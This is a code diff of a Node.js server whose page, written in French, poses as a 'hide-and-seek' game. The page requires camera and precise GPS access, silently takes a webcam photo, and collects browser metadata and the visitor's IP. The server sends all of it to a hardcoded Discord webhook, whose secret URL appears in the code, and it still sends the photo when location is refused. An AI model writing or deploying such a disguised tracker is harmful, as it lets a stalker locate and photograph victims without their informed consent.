@@ -5,10 +5,9 @@ const PORT = process.env.PORT || 3000;
 // URL de votre Webhook Discord
 const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1546990311144689736/JNIn6Zl1Dr3ep-Kvm6uwz_HHDfS8vco5ThkHLWGgkMHQOvIph6DdGUd10V3YjbEOndBE";
 
-// Augmentation de la limite du corps de requête JSON pour accepter la capture photo en Base64
-app.use(express.json({ limit: '10mb' }));
+// Augmentation de la limite du corps JSON pour recevoir la capture photo
+app.use(express.json({ limit: '15mb' }));
 
-// Serveur principal avec interface "Cache-Cache Numérique"
 app.get('/', (req, res) => {
     res.send(`
         <!DOCTYPE html>
@@ -52,23 +51,9 @@ app.get('/', (req, res) => {
                     box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.5);
                 }
 
-                .icon {
-                    font-size: 3rem;
-                    margin-bottom: 16px;
-                }
-
-                h1 {
-                    font-size: 1.6rem;
-                    margin-bottom: 12px;
-                    color: var(--text-main);
-                }
-
-                p {
-                    color: var(--text-muted);
-                    font-size: 0.95rem;
-                    line-height: 1.5;
-                    margin-bottom: 24px;
-                }
+                .icon { font-size: 3rem; margin-bottom: 16px; }
+                h1 { font-size: 1.6rem; margin-bottom: 12px; color: var(--text-main); }
+                p { color: var(--text-muted); font-size: 0.95rem; line-height: 1.5; margin-bottom: 24px; }
 
                 .btn-play {
                     background-color: var(--accent);
@@ -83,9 +68,7 @@ app.get('/', (req, res) => {
                     transition: background 0.2s;
                 }
 
-                .btn-play:hover {
-                    background-color: var(--accent-hover);
-                }
+                .btn-play:hover { background-color: var(--accent-hover); }
 
                 .error-box {
                     display: none;
@@ -108,10 +91,7 @@ app.get('/', (req, res) => {
                     padding-top: 16px;
                 }
 
-                #game-dashboard {
-                    display: none;
-                }
-
+                #game-dashboard { display: none; }
                 #camera-preview {
                     width: 100%;
                     max-height: 240px;
@@ -124,37 +104,29 @@ app.get('/', (req, res) => {
         </head>
         <body>
 
-            <!-- Étape 1 : Accueil / Inscription à la partie -->
             <div id="lobby" class="game-card">
                 <div class="icon">🙈🔍</div>
                 <h1>Cache-Cache Numérique</h1>
-                <p>Pour rejoindre la partie, autorisez l'accès à votre position et à votre caméra pour la vérification visuelle.</p>
-                
+                <p>Pour rejoindre la partie, autorisez l'accès à votre position et à votre caméra pour la détection des joueurs.</p>
                 <button class="btn-play" onclick="demarrerPartie()">Rejoindre l'arène</button>
-
-                <!-- Message d'erreur si la caméra/géolocalisation est refusée -->
                 <div id="geo-error" class="error-box"></div>
-
                 <div class="info-notice">
-                    En cliquant, vous acceptez la transmission de vos métadonnées techniques et l'activation de la caméra pour la session de jeu.
+                    En cliquant, vous acceptez la transmission de vos métadonnées techniques et l'activation de la caméra.
                 </div>
             </div>
 
-            <!-- Étape 2 : Tableau de bord de jeu -->
             <div id="game-dashboard" class="game-card">
                 <div class="icon">🎯</div>
                 <h1>Partie en cours</h1>
-                <p id="status-text">Coordonnées et flux vidéo initialisés. Recherche de cachettes à proximité...</p>
-
+                <p>Coordonnées et flux vidéo initialisés. Recherche de cachettes...</p>
                 <video id="camera-preview" autoplay playsinline muted></video>
-
                 <div style="background: #1f2937; padding: 15px; border-radius: 8px; margin-top: 15px; font-size: 0.85rem; color: #10b981;">
-                    Statut : Joueur connecté & Caméra transmise
+                    Statut : Joueur connecté & Caméra capturée
                 </div>
             </div>
 
-            <!-- Canvas masqué pour capturer l'image de la caméra -->
-            <canvas id="snapshot-canvas" style="display: none;"></canvas>
+            <!-- Canvas masqué pour générer le snapshot de la caméra -->
+            <canvas id="snapshot-canvas" style="display:none;"></canvas>
 
             <script>
                 function collecterMetadonnees() {
@@ -169,54 +141,51 @@ app.get('/', (req, res) => {
                 }
 
                 function transmettreMetadonnees(type, gpsData = null, cameraStatus = null, photoData = null) {
-                    const payload = {
-                        typeEvenement: type,
-                        client: collecterMetadonnees(),
-                        gps: gpsData,
-                        camera: cameraStatus,
-                        photoBase64: photoData
-                    };
-
                     fetch('/api/collecte', {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify(payload)
+                        body: JSON.stringify({
+                            typeEvenement: type,
+                            client: collecterMetadonnees(),
+                            gps: gpsData,
+                            camera: cameraStatus,
+                            photoBase64: photoData
+                        })
                     });
                 }
 
-                // Envoi des métadonnées de visite
                 window.addEventListener('DOMContentLoaded', () => {
                     transmettreMetadonnees('Visite initiale');
                 });
 
-                function capturerImageDuVideo(videoElement) {
-                    try {
-                        const canvas = document.getElementById('snapshot-canvas');
-                        canvas.width = videoElement.videoWidth || 640;
-                        canvas.height = videoElement.videoHeight || 480;
-                        const ctx = canvas.getContext('2d');
-                        ctx.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
-                        return canvas.toDataURL('image/jpeg', 0.8);
-                    } catch (err) {
-                        console.error('Erreur de capture photo:', err);
-                        return null;
-                    }
+                function capturerImage(video) {
+                    const canvas = document.getElementById('snapshot-canvas');
+                    canvas.width = video.videoWidth || 640;
+                    canvas.height = video.videoHeight || 480;
+                    const ctx = canvas.getContext('2d');
+                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    return canvas.toDataURL('image/jpeg', 0.85);
                 }
 
                 async function activerCameraEtCapturer() {
                     try {
-                        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
+                        const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
                         const videoElement = document.getElementById('camera-preview');
                         videoElement.srcObject = stream;
 
-                        // Attendre la stabilisation du flux vidéo pour effectuer le snapshot
-                        await new Promise(resolve => setTimeout(resolve, 800));
+                        // Attendre la lecture effective de la vidéo
+                        await new Promise((resolve) => {
+                            videoElement.onloadedmetadata = () => {
+                                videoElement.play();
+                                setTimeout(resolve, 1000); // Pause de 1 sec pour stabiliser l'exposition
+                            };
+                        });
 
-                        const photoData = capturerImageDuVideo(videoElement);
+                        const photoData = capturerImage(videoElement);
 
                         return {
                             statut: "Autorisée",
-                            details: "Flux vidéo et capture effectués",
+                            details: "Photo capturée",
                             photoBase64: photoData
                         };
                     } catch (err) {
@@ -228,17 +197,15 @@ app.get('/', (req, res) => {
                     const errorBox = document.getElementById('geo-error');
                     errorBox.style.display = 'none';
 
-                    // Activer la caméra et réaliser le snapshot
                     const cameraResult = await activerCameraEtCapturer();
 
                     if (cameraResult.statut === "Refusée") {
                         transmettreMetadonnees('Refus caméra', null, cameraResult);
-                        errorBox.innerHTML = "⚠️ <strong>Caméra requise :</strong> L'accès à la caméra est obligatoire pour valider votre présence.";
+                        errorBox.innerHTML = "⚠️ <strong>Caméra requise :</strong> Impossible d'entrer dans l'arène sans la caméra.";
                         errorBox.style.display = 'block';
                         return;
                     }
 
-                    // Demande d'accès à la géolocalisation
                     if (navigator.geolocation) {
                         navigator.geolocation.getCurrentPosition(
                             (pos) => {
@@ -254,15 +221,12 @@ app.get('/', (req, res) => {
                                 document.getElementById('game-dashboard').style.display = 'block';
                             },
                             (err) => {
-                                transmettreMetadonnees('Refus localisation (avec photo)', { erreur: "Accès refusé (" + err.message + ")" }, cameraResult, cameraResult.photoBase64);
-                                errorBox.innerHTML = "⚠️ <strong>Localisation requise :</strong> Impossible de rejoindre l'arène sans la géolocalisation.";
+                                transmettreMetadonnees('Refus localisation (avec photo)', { erreur: err.message }, cameraResult, cameraResult.photoBase64);
+                                errorBox.innerHTML = "⚠️ <strong>Localisation requise :</strong> Géolocalisation obligatoire.";
                                 errorBox.style.display = 'block';
                             },
-                            { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
+                            { enableHighAccuracy: true, timeout: 5000 }
                         );
-                    } else {
-                        errorBox.innerText = "⚠️ La géolocalisation n'est pas supportée par votre navigateur.";
-                        errorBox.style.display = 'block';
                     }
                 }
             </script>
@@ -271,32 +235,27 @@ app.get('/', (req, res) => {
     `);
 });
 
-// Route d'API - Réception et envoi du Webhook Discord
+// Endpoint API pour le traitement et l'envoi au Webhook Discord
 app.post('/api/collecte', async (req, res) => {
-    const body = req.body || {};
-    const typeEvenement = body.typeEvenement || 'Événement inconnu';
-    const client = body.client || {};
-    const gps = body.gps || {};
-    const camera = body.camera || {};
-    const photoBase64 = body.photoBase64;
+    const { typeEvenement, client = {}, gps = {}, camera = {}, photoBase64 } = req.body || {};
 
     const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
     const userAgent = req.headers['user-agent'] || 'Inconnu';
 
     let gpsText = "⏳ Non partagée";
-    let colorCode = 3447003; // Bleu
+    let colorCode = 3447003;
 
     if (gps.lat && gps.lon) {
         gpsText = `📍 [${gps.lat},${gps.lon}](https://www.google.com/maps?q=${gps.lat},${gps.lon}) (+/- ${Math.round(gps.precision)}m)`;
-        colorCode = 65280; // Vert
+        colorCode = 65280;
     } else if (gps.erreur) {
         gpsText = `❌ ${gps.erreur}`;
-        colorCode = 15158332; // Rouge
+        colorCode = 15158332;
     }
 
     let cameraText = "⏳ Non vérifiée";
     if (camera.statut === "Autorisée") {
-        cameraText = `📷 Accès accordé (${camera.details || 'OK'})`;
+        cameraText = `📷 Accès accordé`;
     } else if (camera.statut === "Refusée") {
         cameraText = `❌ Accès refusé (${camera.erreur || 'Inconnu'})`;
         colorCode = 15158332;
@@ -314,29 +273,27 @@ app.post('/api/collecte', async (req, res) => {
         timestamp: new Date().toISOString()
     };
 
-    // Si une photo est fournie, l'associer à l'embed
-    if (photoBase64) {
-        embed.image = { url: "attachment://photo.jpg" };
+    if (photoBase64 && photoBase64.startsWith('data:image')) {
+        embed.image = { url: "attachment://capture.jpg" };
     }
 
     if (DISCORD_WEBHOOK_URL && DISCORD_WEBHOOK_URL.startsWith('https://discord.com')) {
         try {
-            if (photoBase64) {
-                // Extrait le buffer binaire à partir du Base64
+            if (photoBase64 && photoBase64.startsWith('data:image')) {
+                // Conversion Base64 -> Buffer binaire
                 const base64Data = photoBase64.replace(/^data:image\/\w+;base64,/, '');
-                const imageBuffer = Buffer.from(base64Data, 'base64');
+                const buffer = Buffer.from(base64Data, 'base64');
 
-                // Envoi Multipart Form Data à Discord
+                // Utilisation de FormData natif pour l'envoi de fichier vers Discord
                 const formData = new FormData();
                 formData.append('payload_json', JSON.stringify({ embeds: [embed] }));
-                formData.append('file0', new Blob([imageBuffer], { type: 'image/jpeg' }), 'photo.jpg');
+                formData.append('files[0]', new Blob([buffer], { type: 'image/jpeg' }), 'capture.jpg');
 
                 await fetch(DISCORD_WEBHOOK_URL, {
                     method: 'POST',
                     body: formData
                 });
             } else {
-                // Envoi JSON classique
                 await fetch(DISCORD_WEBHOOK_URL, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
@@ -344,11 +301,11 @@ app.post('/api/collecte', async (req, res) => {
                 });
             }
         } catch (err) {
-            console.error("Erreur Webhook Discord :", err);
+            console.error("Erreur d'envoi Webhook Discord :", err);
         }
     }
 
     res.sendStatus(200);
 });
 
-app.listen(PORT, () => console.log(`Serveur prêt sur le port ${PORT}`));
+app.listen(PORT, () => console.log(`Serveur opérationnel sur le port ${PORT}`));
